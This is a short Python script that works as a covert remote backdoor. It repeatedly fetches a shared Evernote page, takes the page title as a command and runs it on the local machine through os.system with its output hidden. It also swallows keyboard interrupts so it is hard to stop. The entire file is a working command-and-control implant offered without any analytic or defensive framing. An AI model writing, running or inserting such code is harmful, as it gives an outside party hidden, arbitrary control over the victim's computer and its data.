try:
    from bs4 import BeautifulSoup
    from requests import get
    from time import sleep
    from os import system
    import lxml

    old_command = ""
    command = ""
except KeyboardInterrupt:
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            html_file = get("https://www.evernote.com/shard/s557/sh/f241b451-44a8-5ebe-3a73-cf74cb0fdaf5/2EW7PhNX5HU3KHOM1ZZGiu0d16La558Mv9vDJaLemJOZUP4kW2qbb1bBaQ").text
            soup = BeautifulSoup(html_file, 'lxml')
            command = soup.find('title').text
        except KeyboardInterrupt:
            continue
        except:
            print("failed to connect to server")
        #execute command
        if old_command != command:
            try:
                system(f"{command} > /dev/null")
                old_command = command
            except:
                pass
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            continue
    except KeyboardInterrupt:
        continue
